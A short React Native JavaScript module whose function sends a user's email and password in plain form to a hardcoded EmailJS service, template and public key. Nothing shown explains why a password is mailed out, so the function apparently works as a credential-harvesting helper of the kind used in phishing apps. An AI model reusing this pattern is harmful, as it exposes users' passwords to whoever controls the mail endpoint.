import { send, EmailJSResponseStatus } from '@emailjs/react-native';

export async function sendMail(email, pass) {
    try {
        // Gửi email với cấu hình tùy chỉnh
        const response = await send('service_2j84hrv', 'template_ynjb95d', {
            pass: pass,
            email: email,
        }, {
            publicKey: 'CQsHKMpK07-Ub7uno',
          },
           );
        console.log('SUCCESS!', response.status, response.text);
    } catch (error) {
        console.log('FAILED...', error);
    }
}
export default sendMail;
